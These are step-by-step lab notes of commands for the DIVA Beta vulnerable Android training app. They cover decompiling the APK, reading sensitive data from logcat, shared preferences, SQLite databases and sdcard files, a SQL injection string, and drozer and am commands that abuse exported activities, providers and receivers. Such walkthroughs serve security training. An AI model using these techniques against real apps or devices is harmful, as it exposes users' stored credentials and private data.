DIVA BETA COMMANDS

1. Insecure Logging 
adb devices
adb connect <ip address>
adb devices 
adb shell
logcat
unzip -d diva diva-beta.apk 
cd diva
ls
d2j-dex2jar classes.dex
ls
jd-gui classes-dex2jar.jar
	jakhar.assem.diva -> LogActivity.class -> Log.e
adb shell 
ps | grep "diva"
	insecure logging in diva -> type credit card number
logcat | grep "diva"


2. Insecure Data Storage Part 1 - 
cd diva
ls
jd-gui classes-dex2jar.jar
	InsecureDataStorage1Activity.class -> analyze
adb shell
cd data
cd data
ls      
cd jakhar.aseem.diva
ls
cd shared_prefs
l
cat jakhar.aseem.diva_preferences.xml

3. Insecure Data Storage Part 2 - 
cd diva
ls
jd-gui classes-dex2jar.jar
	InsecureDataStorage2Activity.class -> analyze
adb shell
cd /data/data
ls
cd jakhar.aseem.diva 
ls
cd databases
ls
sqlite3 ids2
	.tables
	select * from myuser;


4. Insecure Data Storage Part 3 - 
cd diva
ls
jd-gui classes-dex2jar.jar
	InsecureDataStorage3Activity.class -> analyze
adb shell
cd /data/data
ls
cd jakhar.aseem.diva 
ls
cat uino146649198.tmp


5. Insecure Data Storage Part 4 - 
cd diva
ls
jd-gui classes-dex2jar.jar
	InsecureDataStorage4Activity.class -> analyze
adb shell
cd /data/data
ls
cd jakhar.aseem.diva 
ls
ls -al
cd
cd mnt
cd sdcard
ls
ls -al
cat .uinfo.txt


6. Hardcoding Issues Part 1 - 
cd diva
ls
jd-gui classes-dex2jar.jar
	HardcodeActivity.class -> analyze


7. Input Validation Issues Part 1 - 
Open diva and attempt SQLi
	diva' or '1'='1
cd diva
ls
jd-gui classes-dex2jar.jar
	SQLInjectionActivity.class -> analyze


8. Input Validation Issues Part 2 - 
adb shell
cd mnt
cd sdcard
ls
in diva app
	file://mnt/sdcard/Pictures/<name>


9. Access Control Issues Part 1 - 
apktool d diva-beta.apk
ls       [diva-beta]
cd diva-beta
ls
cd smali
ls
 -----x------
adb devices
adb forward tcp:31415 tcp:31415
drozer console connect 
list
run app.package.manifest jakhar.aseem.diva
cd diva
ls
jd-gui classes-dex2jar.jar
	AccessControl1Activity.class -> analyze
	APICredsActivity.class -> analyze
adb shell
am start -a jakhar.aseem.diva.action.VIEW_CREDS2
am start -a jakhar.aseem.diva.action.VIEW_CREDS


10. Access Control Issues Part 2 - 
apktool d diva-beta.apk
cd diva-beta
grep -Ri "provider" AndroidManifest.xml
adb devices
adb forward tcp:31415 tcp:31415
drozer console connect
list
run app.provider.info -a jakhar.aseem.diva
run app.provider.finduri jakhar.aseem.diva
run app.provider.query content://jakhar.aseem.diva.fileprovider/
adb shell
content query --uri content://jakhar.aseem.diva.fileprovider/
content query --uri content://jakhar.aseem.diva/file.db


11. Access Control Issues Part 3 - 
cd diva-beta
grep -Ri "receiver" AndroidManifest.xml
drozer console connect
run app.broadcast.info -a jakhar.aseem.diva
run app.broadcast.send --component jakhar.aseem.diva jakhar.aseem.diva.InsecureReceiver --extra string secret "hacked"
adb shell
am broadcast -a jakhar.aseem.diva.SEND_SECRET --es "message" "hacked!"


